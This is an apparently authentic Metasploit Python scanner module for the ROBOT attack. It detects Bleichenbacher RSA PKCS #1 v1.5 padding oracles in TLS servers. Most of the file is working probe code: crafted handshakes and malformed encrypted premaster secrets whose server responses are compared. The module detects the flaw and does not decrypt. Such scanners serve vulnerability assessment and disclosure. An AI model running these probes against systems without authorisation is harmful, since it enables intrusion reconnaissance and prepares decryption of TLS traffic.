#!/usr/bin/env python3

# standard modules
import math
import time
import sys
import socket
import os
import ssl

# extra modules
dependencies_missing = False
try:
    import gmpy2
    from cryptography import x509
    from cryptography.hazmat.backends import default_backend
except ImportError:
    dependencies_missing = True

from metasploit import module


metadata = {
    'name': 'Scanner for Bleichenbacher Oracle in RSA PKCS #1 v1.5',
    'description': '''
        Some TLS implementations handle errors processing RSA key exchanges and
        encryption (PKCS #1 v1.5 messages) in a broken way that leads an
        adaptive chosen-chiphertext attack. Attackers cannot recover a server's
        private key, but they can decrypt and sign messages with it. A strong
        oracle occurs when the TLS server does not strictly check message
        formatting and needs less than a million requests on average to decode
        a given ciphertext. A weak oracle server strictly checks message
        formatting and often requires many more requests to perform the attack.

        This module requires Python 3 with the gmpy2 and cryptography packages
        to be present.
     ''',
    'authors': [
        'Hanno Böck', # Research and PoC
        'Juraj Somorovsky', # Research and PoC
        'Craig Young', # Research and PoC
        'Daniel Bleichenbacher', # Original practical attack
        'Adam Cammack <adam_cammack[AT]rapid7.com>'  # Metasploit module
    ],
    'date': '2009-06-17',
    'references': [
        {'type': 'cve', 'ref': '2017-6168'}, # F5 BIG-IP
        {'type': 'cve', 'ref': '2017-17382'}, # Citrix NetScaler
        {'type': 'cve', 'ref': '2017-17427'}, # Radware
        {'type': 'cve', 'ref': '2017-17428'}, # Cisco ACE
        {'type': 'cve', 'ref': '2017-12373'}, # Cisco ASA
        {'type': 'cve', 'ref': '2017-13098'}, # Bouncy Castle
        {'type': 'cve', 'ref': '2017-1000385'}, # Erlang
        {'type': 'cve', 'ref': '2017-13099'}, # WolfSSL
        {'type': 'cve', 'ref': '2016-6883'}, # MatrixSSL
        {'type': 'cve', 'ref': '2012-5081'}, # Oracle Java
        {'type': 'url', 'ref': 'https://robotattack.org'},
        {'type': 'url', 'ref': 'https://eprint.iacr.org/2017/1189'},
        {'type': 'url', 'ref': 'https://github.com/robotattackorg/robot-detect'} # Original PoC
     ],
    'type': 'single_scanner',
    'options': {
        'rhost': {'type': 'address', 'description': 'The target address', 'required': True, 'default': None},
        'rport': {'type': 'port', 'description': 'The target port', 'required': True, 'default': 443},
        'cipher_group': {'type': 'enum', 'description': 'Use TLS_RSA ciphers with AES and 3DES ciphers, or only TLS_RSA_WITH_AES_128_CBC_SHA or TLS-RSA-WITH-AES-128-GCM-SHA256', 'required': True, 'default': 'all', 'values': ['all', 'cbc', 'gcm']},
        'timeout': {'type': 'int', 'description': 'The delay to wait for TLS responses', 'required': True, 'default': 5}
     },
     'notes': {
         'AKA': [
            'ROBOT',
            'Adaptive chosen-ciphertext attack'
         ]
     }}

cipher_handshakes = {
    # This uses all TLS_RSA ciphers with AES and 3DES
    'all': bytearray.fromhex("16030100610100005d03034f20d66cba6399e552fd735d75feb0eeae2ea2ebb357c9004e21d0c2574f837a000010009d003d0035009c003c002f000a00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203"),
    # This uses only TLS_RSA_WITH_AES_128_CBC_SHA (0x002f)
    'cbc': bytearray.fromhex("1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004002f00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203"),
    # This uses only TLS-RSA-WITH-AES-128-GCM-SHA256 (0x009c)
    'gcm': bytearray.fromhex("1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004009c00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")
}
ch_def = cipher_handshakes['all']

ccs = bytearray.fromhex("000101")
enc = bytearray.fromhex("005091a3b6aaa2b64d126e5583b04c113259c4efa48e40a19b8e5f2542c3b1d30f8d80b7582b72f08b21dfcbff09d4b281676a0fb40d48c20c4f388617ff5c00808a96fbfe9bb6cc631101a6ba6b6bc696f0")


def get_rsa_from_server(target, timeout=5):
    try:
        s = socket.create_connection(target, timeout)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_ciphers("RSA")
        s = ctx.wrap_socket(s)
        cert_raw = s.getpeercert(binary_form=True)
        cert_dec = x509.load_der_x509_certificate(cert_raw, default_backend())
        return cert_dec.public_key().public_numbers().n, cert_dec.public_key().public_numbers().e
    except Exception as e:
        return (None, e)


def tls_connect(target, timeout=5, cipher_handshake=ch_def):
    s = socket.create_connection(target, 3)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.settimeout(timeout)
    s.sendall(cipher_handshake)
    buf = bytearray()
    i = 0
    bend = 0
    while True:
        # we try to read twice
        while i + 5 > bend:
            buf += s.recv(4096)
            bend = len(buf)
        # this is the record size
        psize = buf[i + 3] * 256 + buf[i + 4]
        # if the size is 2, we received an alert
        if (psize == 2):
            return ("The server sends an Alert after ClientHello")
        # try to read further record data
        while i + psize + 5 > bend:
            buf += s.recv(4096)
            bend = len(buf)
        # check whether we have already received a ClientHelloDone
        if (buf[i + 5] == 0x0e) or (buf[bend - 4] == 0x0e):
            break
        i += psize + 5

    return (s, buf[9:11])

def oracle(target, pms, cke_2nd_prefix, cipher_handshake=ch_def, messageflow=False, timeout=5):
    try:
        s, cke_version = tls_connect(target, timeout)
        s.send(bytearray(b'\x16') + cke_version)
        s.send(cke_2nd_prefix)
        s.send(pms)
        if not messageflow:
            s.send(bytearray(b'\x14') + cke_version + ccs)
            s.send(bytearray(b'\x16') + cke_version + enc)
        try:
            alert = s.recv(4096)
            if len(alert) == 0:
                return ("No data received from server")
            if alert[0] == 0x15:
                if len(alert) < 7:
                    return ("TLS alert was truncated (%s)" % (repr(alert)))
                return ("TLS alert %i of length %i" % (alert[6], len(alert)))
            else:
                return "Received something other than an alert (%s)" % (alert[0:10])
        except ConnectionResetError as e:
            return "ConnectionResetError"
        except socket.timeout:
            return ("Timeout waiting for alert")
        s.close()
    except Exception as e:
        return str(e)


def run(args):
    if dependencies_missing:
        module.log("Module dependencies (gmpy2 and cryptography python libraries) missing, cannot continue", level='error')
        return

    target = (args['rhost'], int(args['rport']))
    timeout = float(args['timeout'])
    cipher_handshake = cipher_handshakes[args['cipher_group']]

    module.log("{}:{} - Scanning host for Bleichenbacher oracle".format(*target), level='debug')

    N, e = get_rsa_from_server(target, timeout)

    if not N:
        module.log("{}:{} - Cannot establish SSL connection: {}".format(*target, e), level='error')
        return

    modulus_bits = int(math.ceil(math.log(N, 2)))
    modulus_bytes = (modulus_bits + 7) // 8
    module.log("{}:{} - RSA N: {}".format(*target, hex(N)), level='debug')
    module.log("{}:{} - RSA e: {}".format(*target, hex(e)), level='debug')
    module.log("{}:{} - Modulus size: {} bits, {} bytes".format(*target, modulus_bits, modulus_bytes), level='debug')

    cke_2nd_prefix = bytearray.fromhex("{0:0{1}x}".format(modulus_bytes + 6, 4) + "10" + "{0:0{1}x}".format(modulus_bytes + 2, 6) + "{0:0{1}x}".format(modulus_bytes, 4))
    # pad_len is length in hex chars, so bytelen * 2
    pad_len = (modulus_bytes - 48 - 3) * 2
    rnd_pad = ("abcd" * (pad_len // 2 + 1))[:pad_len]

    rnd_pms = "aa112233445566778899112233445566778899112233445566778899112233445566778899112233445566778899"
    pms_good_in = int("0002" + rnd_pad + "00" + "0303" + rnd_pms, 16)
    # wrong first two bytes
    pms_bad_in1 = int("4117" + rnd_pad + "00" + "0303" + rnd_pms, 16)
    # 0x00 on a wrong position, also trigger older JSSE bug
    pms_bad_in2 = int("0002" + rnd_pad + "11" + rnd_pms + "0011", 16)
    # no 0x00 in the middle
    pms_bad_in3 = int("0002" + rnd_pad + "11" + "1111" + rnd_pms, 16)
    # wrong version number (according to Klima / Pokorny / Rosa paper)
    pms_bad_in4 = int("0002" + rnd_pad + "00" + "0202" + rnd_pms, 16)

    pms_good = int(gmpy2.powmod(pms_good_in, e, N)).to_bytes(modulus_bytes, byteorder="big")
    pms_bad1 = int(gmpy2.powmod(pms_bad_in1, e, N)).to_bytes(modulus_bytes, byteorder="big")
    pms_bad2 = int(gmpy2.powmod(pms_bad_in2, e, N)).to_bytes(modulus_bytes, byteorder="big")
    pms_bad3 = int(gmpy2.powmod(pms_bad_in3, e, N)).to_bytes(modulus_bytes, byteorder="big")
    pms_bad4 = int(gmpy2.powmod(pms_bad_in4, e, N)).to_bytes(modulus_bytes, byteorder="big")

    oracle_good = oracle(target, pms_good, cke_2nd_prefix, cipher_handshake, messageflow=False, timeout=timeout)
    oracle_bad1 = oracle(target, pms_bad1, cke_2nd_prefix, cipher_handshake, messageflow=False, timeout=timeout)
    oracle_bad2 = oracle(target, pms_bad2, cke_2nd_prefix, cipher_handshake, messageflow=False, timeout=timeout)
    oracle_bad3 = oracle(target, pms_bad3, cke_2nd_prefix, cipher_handshake, messageflow=False, timeout=timeout)
    oracle_bad4 = oracle(target, pms_bad4, cke_2nd_prefix, cipher_handshake, messageflow=False, timeout=timeout)

    if (oracle_good == oracle_bad1 == oracle_bad2 == oracle_bad3 == oracle_bad4):
        module.log("{}:{} - Identical results ({}), retrying with changed messageflow".format(*target, oracle_good), level='info')
        oracle_good = oracle(target, pms_good, cke_2nd_prefix, cipher_handshake, messageflow=True, timeout=timeout)
        oracle_bad1 = oracle(target, pms_bad1, cke_2nd_prefix, cipher_handshake, messageflow=True, timeout=timeout)
        oracle_bad2 = oracle(target, pms_bad2, cke_2nd_prefix, cipher_handshake, messageflow=True, timeout=timeout)
        oracle_bad3 = oracle(target, pms_bad3, cke_2nd_prefix, cipher_handshake, messageflow=True, timeout=timeout)
        oracle_bad4 = oracle(target, pms_bad4, cke_2nd_prefix, cipher_handshake, messageflow=True, timeout=timeout)
        if (oracle_good == oracle_bad1 == oracle_bad2 == oracle_bad3 == oracle_bad4):
            module.log("{}:{} - Identical results ({}), no working oracle found".format(*target, oracle_good), level='info')
            return
        else:
            flow = True
    else:
        flow = False

    # Re-checking all oracles to avoid unreliable results
    oracle_good_verify = oracle(target, pms_good, cke_2nd_prefix, cipher_handshake, messageflow=flow, timeout=timeout)
    oracle_bad_verify1 = oracle(target, pms_bad1, cke_2nd_prefix, cipher_handshake, messageflow=flow, timeout=timeout)
    oracle_bad_verify2 = oracle(target, pms_bad2, cke_2nd_prefix, cipher_handshake, messageflow=flow, timeout=timeout)
    oracle_bad_verify3 = oracle(target, pms_bad3, cke_2nd_prefix, cipher_handshake, messageflow=flow, timeout=timeout)
    oracle_bad_verify4 = oracle(target, pms_bad4, cke_2nd_prefix, cipher_handshake, messageflow=flow, timeout=timeout)

    if (oracle_good != oracle_good_verify) or (oracle_bad1 != oracle_bad_verify1) or (oracle_bad2 != oracle_bad_verify2) or (oracle_bad3 != oracle_bad_verify3) or (oracle_bad4 != oracle_bad_verify4):
        module.log("{}:{} - Getting inconsistent results, skipping".format(*target), level='warning')
        return

    # If the response to the invalid PKCS#1 request (oracle_bad1) is equal to both
    # requests starting with 0002, we have a weak oracle. This is because the only
    # case where we can distinguish valid from invalid requests is when we send
    # correctly formatted PKCS#1 message with 0x00 on a correct position. This
    # makes our oracle weak
    if (oracle_bad1 == oracle_bad2 == oracle_bad3):
        oracle_strength = "weak"
    else:
        oracle_strength = "strong"

    if flow:
        flowt = "shortened"
    else:
        flowt = "standard"

    s, cke_version = tls_connect(target, timeout, cipher_handshake)
    s.close()

    if cke_version[0] == 3 and cke_version[1] == 0:
        tlsver = "SSLv3"
    elif cke_version[0] == 3 and cke_version[1] == 1:
        tlsver = "TLSv1.0"
    elif cke_version[0] == 3 and cke_version[1] == 2:
        tlsver = "TLSv1.1"
    elif cke_version[0] == 3 and cke_version[1] == 3:
        tlsver = "TLSv1.2"
    else:
        tlsver = "TLS raw version %i/%i" % (cke_version[0], cke_version[1])

    module.report_vuln(target[0], 'Bleichenbacher Oracle', port=target[1])
    module.log("{}:{} - Vulnerable: ({}) oracle found {} with {} message flow".format(*target, oracle_strength, tlsver, flowt), level='good')

    module.log("{}:{} - Result of good request:                        {}".format(*target, oracle_good), level='debug')
    module.log("{}:{} - Result of bad request 1 (wrong first bytes):   {}".format(*target, oracle_bad1), level='debug')
    module.log("{}:{} - Result of bad request 2 (wrong 0x00 position): {}".format(*target, oracle_bad2), level='debug')
    module.log("{}:{} - Result of bad request 3 (missing 0x00):        {}".format(*target, oracle_bad3), level='debug')
    module.log("{}:{} - Result of bad request 4 (bad TLS version):     {}".format(*target, oracle_bad4), level='debug')


if __name__ == "__main__":
    module.run(metadata, run)
